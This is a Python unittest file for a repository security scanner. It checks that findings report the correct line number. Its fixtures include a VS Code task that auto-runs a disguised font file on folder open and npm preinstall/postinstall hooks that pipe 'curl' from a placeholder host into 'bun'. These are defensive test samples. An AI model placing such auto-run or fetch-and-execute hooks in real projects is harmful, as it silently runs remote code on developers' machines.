#!/usr/bin/env python3
"""A finding that sits on one line of a file names that line."""
from __future__ import annotations

import tempfile
import unittest
from pathlib import Path

from stayawake.bots.security.jsonc import line_of_entry, object_spans
from stayawake.bots.security.scanner import scan_target
from stayawake.bots.security.signatures import load_signatures
from stayawake.bots.security.targets import LocalRepoTarget, ScanOptions

_SIGS = load_signatures()
_FONT = "node ./public/fonts/fa-solid-400.woff2"
_FETCH = "curl -s https://x.invalid/y | bun -"

_TASKS = """\
{
  // "runOn": "folderOpen"
  // "command": "node ./public/fonts/fa-solid-400.woff2"
  "version": "2.0.0",
  "tasks": [
    {
      "label": "first",
      "type": "shell",
      "command": "echo ok",
      "runOptions": { "runOn": "folderOpen" },
    },
    {
      "label": "second",
      "type": "shell",
      // "runOn": "folderOpen"
      "command": "echo ok",
      "osx": { "command": "node ./public/fonts/fa-solid-400.woff2" },
      "runOptions": { "runOn": "folderOpen" },
    },
  ],
}
"""
_SETTINGS = """\
{
  // "task.allowAutomaticTasks": "on"
  "editor.fontSize": 14,
  "task.allowAutomaticTasks": "on",
}
"""
_PACKAGE = """\
{
  "name": "x",
  "version": "1.0.0",
  // "postinstall": "curl -s https://x.invalid/a | bun -"
  "scripts": {
    "preinstall": "curl -s https://x.invalid/a | bun -",
    "postinstall": "curl -s https://x.invalid/b | bun -",
  },
}
"""


def _line(text: str, needle: str, start: int = 0) -> int:
    return text.count("\n", 0, text.index(needle, start)) + 1


def _scan(files: dict[str, str]):
    root = Path(tempfile.mkdtemp(prefix="finding-line-"))
    for rel, text in files.items():
        path = root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8")
    return scan_target(LocalRepoTarget(root, "t", ScanOptions()), _SIGS, [])


class TestAFindingNamesItsLine(unittest.TestCase):
    def test_a_task_not_on_the_first_line_names_its_own_line(self):
        result = _scan({".vscode/tasks.json": _TASKS, ".vscode/settings.json": _SETTINGS})
        second = _TASKS.index('"label": "second"')
        command = _line(_TASKS, f'"command": "{_FONT}"', second)
        first_run = _line(_TASKS, '"runOn"', _TASKS.index('"label": "first"'))
        second_run = _line(_TASKS, '"runOn"', _TASKS.index('"runOptions"', second))
        setting = _line(_SETTINGS, '"task.allowAutomaticTasks"', _SETTINGS.index("editor.fontSize"))

        by_task = {f.evidence: f for f in result.findings if f.signature_id == "vscode-task-autorun-visible"}
        font = next(f for f in result.findings if f.signature_id == "vscode-task-runs-font")
        allowed = next(f for f in result.findings if f.signature_id == "vscode-allow-automatic-tasks")

        self.assertEqual(by_task["task 'first' runOn=folderOpen"].line, first_run)
        self.assertEqual(by_task["task 'second' runOn=folderOpen"].line, second_run)
        self.assertEqual(font.line, command)
        self.assertEqual(font.to_dict()["line"], command)
        self.assertEqual(allowed.line, setting)
        self.assertNotEqual(first_run, 1)
        self.assertNotEqual(command, first_run)
        self.assertNotEqual(command, second_run)
        self.assertNotEqual(first_run, second_run)
        self.assertGreater(setting, 1)

    def test_a_task_on_one_line_names_that_line(self):
        text = ('{"version":"2.0.0","tasks":[{"label":"x","type":"shell",'
                f'"command":"{_FONT}","runOptions":{{"runOn":"folderOpen"}}}}]}}')
        result = _scan({".vscode/tasks.json": text})
        found = [f for f in result.findings if f.signature_id in
                 {"vscode-task-runs-font", "vscode-task-autorun-visible"}]
        self.assertGreaterEqual(len(found), 2)
        self.assertTrue(all(f.line == 1 for f in found))

    def test_a_package_script_not_on_the_first_line_names_its_line(self):
        result = _scan({"package.json": _PACKAGE})
        scripts = _PACKAGE.index('"scripts"')
        expected = {
            "preinstall": _line(_PACKAGE, '"preinstall":', scripts),
            "postinstall": _line(_PACKAGE, '"postinstall":', scripts),
        }
        found = [f for f in result.findings if f.signature_id == "npm-lifecycle-remote-fetch"]
        self.assertEqual({f.evidence.split(":", 1)[0]: f.line for f in found}, expected)
        self.assertTrue(all(line > 1 for line in expected.values()))
        self.assertNotEqual(expected["preinstall"], expected["postinstall"])

    def test_a_package_script_on_one_line_names_that_line(self):
        text = ('{"name":"x","version":"1.0.0","scripts":'
                f'{{"postinstall":"{_FETCH}"}}}}')
        result = _scan({"package.json": text})
        found = [f for f in result.findings if f.signature_id == "npm-lifecycle-remote-fetch"]
        self.assertEqual([f.line for f in found], [1])


class TestTheLineIsTheEntryInTheFile(unittest.TestCase):
    def test_a_comment_is_not_the_entry(self):
        text = '{\n  "tasks": [{\n    // "command": "echo hidden"\n    "command": "echo real"\n  }]\n}\n'
        span = object_spans(text, "tasks")[0]
        self.assertEqual(line_of_entry(text, "command", "echo real", span), 4)
        self.assertIsNone(line_of_entry(text, "command", "echo hidden", span))

    def test_each_object_keeps_its_own_line(self):
        text = '{\n  "tasks": [\n    1,\n    {"command": "echo a"},\n    {"command": "echo b"}\n  ]\n}\n'
        spans = object_spans(text, "tasks")
        self.assertEqual(len(spans), 2)
        self.assertEqual(line_of_entry(text, "command", "echo a", spans[0]), 4)
        self.assertEqual(line_of_entry(text, "command", "echo b", spans[1]), 5)
        self.assertIsNone(line_of_entry(text, "command", "echo b", spans[0]))

    def test_a_byte_order_mark_does_not_move_the_line(self):
        text = '\ufeff{\n  "scripts": {\n    "postinstall": "echo hi"\n  }\n}\n'
        self.assertEqual(line_of_entry(text, "postinstall", "echo hi", object_spans(text, "scripts")[0]), 3)

    def test_a_missing_span_names_no_line(self):
        text = '{"scripts": {"postinstall": "echo hi"}}'
        self.assertIsNone(line_of_entry(text, "postinstall", "echo hi", None))


if __name__ == "__main__":
    unittest.main()
